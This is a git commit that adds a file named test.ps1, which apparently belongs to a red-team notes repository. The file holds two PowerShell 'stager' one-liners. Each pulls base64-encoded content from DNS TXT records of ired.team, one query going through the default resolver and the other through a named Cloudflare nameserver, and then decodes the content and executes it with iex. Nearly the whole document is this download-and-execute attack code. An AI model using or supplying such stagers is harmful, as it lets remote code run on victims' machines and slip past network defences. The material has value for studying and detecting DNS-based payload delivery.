611ea2a1cd418f729bde9b08cf182b92ad97ca34
Mantvydas Baranauskas <mantvydo@gmail.com>
2019-02-06 23:01:00 +0000

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,7 @@
+[*] Stager using non-authoritative NS server (copied to clipboard):
+$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ired.team")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBas
+e64String(($b64 -replace('\t|"',"")))))
+
+[*] Stager using authoritative NS server:
+$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ired.team" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([S
+ystem.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
